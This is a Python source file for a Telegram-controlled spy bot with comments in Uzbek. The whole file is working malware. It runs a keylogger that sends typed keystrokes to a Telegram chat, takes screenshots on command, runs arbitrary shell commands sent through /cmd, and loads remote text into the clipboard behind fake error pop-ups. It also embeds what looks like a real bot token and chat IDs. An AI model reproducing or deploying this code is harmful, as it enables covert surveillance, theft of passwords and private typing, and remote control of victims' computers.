import os
import html
import logging
import asyncio
import threading
import subprocess
import tkinter as tk
from tkinter import *
from tkinter.ttk import *
from tkinter import messagebox
from PIL import ImageGrab
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
from pynput.keyboard import Key, Listener

logging.basicConfig(level=logging.INFO)

BOT_TOKEN = '6793412599:AAFfMXBH4ViBf0xPEx2N3aDjK7t3XHIiLwE'   #BOT TOKEN
ADMIN_ID = '5636174409'                                        #ADMIN ID 
KYL_ID = '-1002107614627'                                      #KEYLOGER YOZADIGAN CHAT ID
KYL_TH = None                                                  #TEGILMAYDI
QUIT = False                                                   #TEGILMAYDI

loop = asyncio.get_event_loop()
bot = Bot(token=BOT_TOKEN, parse_mode=types.ParseMode.HTML)
dp = Dispatcher(bot)

def show_error_message(message, mi=""):
    root = tk.Tk()
    try:
        p1 = PhotoImage(file = 'idle.png') 
        root.iconphoto(True, p1)
    except:pass
    root.withdraw()  # Hide the main window

    messagebox.showerror(f"Error #{mi}", message)
    
async def on_startup(dp):
    await notify_admin_on_start()

async def notify_admin_on_start():
    global KYL_TH
    await bot.send_message(chat_id=ADMIN_ID, text="SPY BOT ishga tushdi!")
    KYL_TH = threading.Thread(target=run_keylogger_in_thread)
    KYL_TH.start()
    await bot.send_message(chat_id=ADMIN_ID, text="KeyLogger ishga tushdi!")

class KeyLogger:
    keys = []
    pressed_keys = set()
    
    def __init__(self, chatid):
        self.chatid = chatid

    def on_press(self, key):
        global KYL_TH, ADMIN_ID, QUIT
        self.keys.append(key)
        try:self.pressed_keys.add(key.name)
        except: pass
        # print(key.name)
        if all(k in self.pressed_keys for k in ['ctrl_r', 'shift_r', 'page_down']):
            error_message = "There's an error in your program: invalid syntax"
            show_error_message(error_message)
            asyncio.run_coroutine_threadsafe(bot.send_message(chat_id=ADMIN_ID, text=f"Kompyuter o'chirildi"), loop)
            KYL_TH.join()

    def write_file(self, keys):
        try:self.pressed_keys.remove(key.name)
        except Exception:pass
        with open('KYL.log', 'a+') as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find('backspace') > 0:
                    f.write('\b')
                elif k.find('space') > 0:
                    f.write(' ')
                elif k.find('enter') > 0:
                    f.write('\n')
                elif k.find('Key') == -1:
                    f.write(k)
        keys.clear()
        
        with open('KYL.log', 'r') as f:
            fr = f.read()
            if fr.count(" ") >= 5:
                asyncio.run_coroutine_threadsafe(bot.send_message(chat_id=self.chatid, text=f"{str(fr)}"), loop)
                with open('KYL.log', 'w') as f:
                    f.truncate(0)
        

    def on_release(self, key):
        self.write_file(self.keys)
        
    def run(self):
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()



@dp.message_handler(commands=['start'])
async def send_welcome(message: types.Message):
    await message.reply("<b>Salom, Botga xush kelibsiz!\n\n/info - Kompyuter Haqida\n/screen - ScreenShot Monitor\n/cmd - Terminal codelarni ishga tushirish</b>")
    

    
def screenshot(chat_id, screenshot_path):
    screenshot_img = ImageGrab.grab()
    screenshot_img.save(screenshot_path)
    asyncio.run_coroutine_threadsafe(bot.send_photo(chat_id=chat_id, photo=open(screenshot_path, 'rb')), loop)


@dp.message_handler(commands=['screen'])
async def send_screen(message: types.Message):
    screenshot_path = 'screenshot.png'
    threading.Thread(target=screenshot, args=(message.chat.id,screenshot_path)).start() 
    
@dp.message_handler(commands=['exit'])
async def send_screen(message: types.Message):
    global KYL_TH
    await message.reply("Chiqish muvaffaqiyatli bajarildi")
    KYL_TH.join()
    quit()


def run_command_in_thread(command, chat_id):
    try:
        result = subprocess.check_output(command, shell=True, text=True)
        escaped_result = html.escape(result)
        
        asyncio.run_coroutine_threadsafe(bot.send_message(chat_id=chat_id, text=f"<code>{escaped_result}</code>"), loop)
    except Exception as e:
        asyncio.run_coroutine_threadsafe(bot.send_message(chat_id=chat_id, text=f"Error occurred: {str(e)}"), loop)



def run_command_in_textcopy(command, chat_id, loop):
    try:
        mi = command[0]
        code = command[2:]
        print(code)
        subprocess.run(['clip'], input=code.encode('utf-8'), check=True)
        asyncio.run_coroutine_threadsafe(bot.send_message(chat_id=chat_id, text=f"<code>Code jo'natildi</code>"), loop)
        error_message = "There's an error in your program: invalid syntax"
        asyncio.run_coroutine_threadsafe(show_error_message(error_message, mi), loop)
    except Exception as e:
        asyncio.run_coroutine_threadsafe(bot.send_message(chat_id=chat_id, text=f"Error occurred: {str(e)}"), loop)


def run_keylogger_in_thread():
    d = KeyLogger(KYL_ID)
    d.run()


@dp.message_handler(commands=['cmd'])
async def run_command(message: types.Message):
    if message.text == '/cmd':
        await message.reply("Command not found!")
        return True
    command = message.text.split('/cmd ', 1)[1]
    threading.Thread(target=run_command_in_thread, args=(command, message.chat.id)).start()


@dp.message_handler(commands=['code'])
async def run_command(message: types.Message):
    if message.text == '/code':
        await message.reply("/code 3 print('SALOM')")
        return True
    command = message.text.split('/code', 1)[1].strip()
    threading.Thread(target=run_command_in_textcopy, args=(command, message.chat.id, loop)).start()



def run():
    executor.start_polling(dp, on_startup=on_startup, skip_updates=True)